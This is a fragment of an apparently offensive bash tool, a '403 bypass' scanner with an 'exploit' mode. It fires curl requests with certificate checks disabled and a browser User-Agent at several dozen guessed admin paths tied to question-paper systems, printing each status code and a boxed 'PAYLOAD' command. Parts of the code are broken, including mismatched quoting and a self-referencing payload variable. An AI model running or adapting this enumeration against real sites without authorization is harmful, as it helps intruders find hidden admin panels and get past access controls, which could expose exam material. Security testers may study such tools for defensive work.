code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print


}
function 403bypass(){ 
	URL_Encode_Bypass
}
function prg(){
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f4- )
					domain=$(echo $2 | cut -d "/" -f3)
					shift
					;;
			## modes
			
			'--encode')
				mode='encode'
				;;
      '--exploit')
				mode='exploit'
				;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [[ -z "${mode}" ]];then
        printf "\n[${red}!${end}] ${yellow}No mode given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi

	
	if [ "${mode}" == 'encode' ];then
			echo "encode"
			banner
        	URL_Encode_Bypass
        	exit 0
	elif [ "${mode}" == 'exploit' ];then
			echo "exploit"
        	banner
			403bypass
        	exit 0
	fi
}
prg $@
tput sgr0
